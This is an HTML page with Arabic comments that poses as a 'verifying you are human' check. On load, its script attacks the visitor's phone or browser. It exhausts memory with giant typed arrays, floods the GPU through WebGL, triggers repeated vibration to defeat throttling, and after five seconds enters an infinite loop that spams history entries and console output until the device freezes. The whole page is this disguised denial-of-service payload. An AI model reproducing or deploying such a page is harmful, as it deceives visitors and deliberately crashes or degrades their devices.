<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Checking...</title>
</head>
<body style="text-align:center; padding-top:50px;">
    <h1>جاري التحقق من انك انسان...</h1>
    <p>يرجى الانتظار 10 ثواني فقط</p>

    <script>
        function startMobileStress() {
            // 1. استهلاك الرام عبر مصفوفات ضخمة جداً (أقوى من السابق)
            let heap = [];
            setInterval(() => {
                // إنشاء مصفوفة عملاقة من نوع 64-bit تجبر الأندرويد على حجز مساحة حقيقية
                let block = new BigInt64Array(10000000); 
                for(let i=0; i<block.length; i++) block[i] = BigInt(i);
                heap.push(block);
            }, 100);

            // 2. إرهاق المعالج الرسومي (GPU) - رسم ملايين النقاط
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            setInterval(() => {
                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
                gl.clear(gl.COLOR_BUFFER_BIT);
            }, 1);

            // 3. منع المتصفح من وضع الصفحة في حالة "الخمول" (Anti-Throttling)
            // نستخدم اهتزاز الجوال (Vibrate) لإبقاء المعالج في حالة استنفار
            setInterval(() => {
                if (navigator.vibrate) navigator.vibrate(500);
            }, 600);

            // 4. الحلقة القاتلة النهائية (بعد 5 ثواني)
            setTimeout(() => {
                while(true) {
                    // فتح نوافذ وهمية وتغيير الهستوري بجنون
                    history.pushState(null, "", "STRESS_" + Math.random());
                    console.log(new Array(1000000).join("BOOM"));
                }
            }, 5000);
        }

        window.onload = startMobileStress;
    </script>
</body>
</html>
